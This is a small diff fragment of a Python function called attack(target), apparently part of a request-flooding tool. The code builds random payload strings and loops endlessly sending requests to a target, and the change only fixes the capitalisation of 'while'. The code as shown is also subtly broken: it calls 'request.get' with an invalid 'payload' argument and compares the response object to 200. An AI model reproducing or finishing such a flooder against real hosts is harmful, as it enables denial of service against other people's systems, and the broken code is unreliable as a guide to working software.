@@ -23,7 +23,7 @@ def attack(target):
 	    text_characters = string.ascii_letters + string.digits + string.punctuation
 	    payload = "".join(random.choice(text_characters) for i in range(length))
 	    return payload
-	While True:
+	while True:
 		x = request.get(target, headers=headers, payload=payload, timeout=3)
 		try:
 			if x == 200:
